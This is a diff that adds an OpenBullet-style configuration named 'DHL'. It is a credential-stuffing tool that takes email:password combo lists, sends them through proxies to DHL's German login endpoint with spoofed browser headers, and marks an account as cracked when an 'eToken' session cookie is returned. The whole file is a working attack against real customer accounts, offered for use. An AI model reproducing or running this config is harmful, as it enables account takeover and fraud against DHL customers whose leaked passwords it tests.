@@ -1,0 +1,77 @@
+[SETTINGS]
+{
+  "Name": "DHL",
+  "SuggestedBots": 40,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-19T16:00:08.9960055-08:00",
+  "AdditionalInfo": "",
+  "Author": "MrBlackX",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION Length "{\"id\":\"<USER>\",\"password\":\"<PASS>\",\"authenticationLevel\":3,\"rememberMe\":false,\"language\":\"de\",\"context\":\"web\",\"meta\":\"\"}" -> VAR "Length" 
+
+REQUEST POST "https://www.dhl.de/int-erkennen/login" 
+  CONTENT "{\"id\":\"<USER>\",\"password\":\"<PASS>\",\"authenticationLevel\":3,\"rememberMe\":false,\"language\":\"de\",\"context\":\"web\",\"meta\":\"\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.dhl.de" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://www.dhl.de/de/privatkunden/pakete-empfangen/an-einem-abholort-empfangen/packstation-empfang.html" 
+  HEADER "Content-Type: application/json" 
+  HEADER "x-erkennen-subject: <USER>" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "CSRF-Token: undefined" 
+  HEADER "Content-Length: <Length>" 
+  HEADER "Origin: https://www.dhl.de" 
+  HEADER "Connection: keep-alive" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<COOKIES(*)>" DoesNotContain "eToken" 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES{*}>" Contains "eToken" 
+
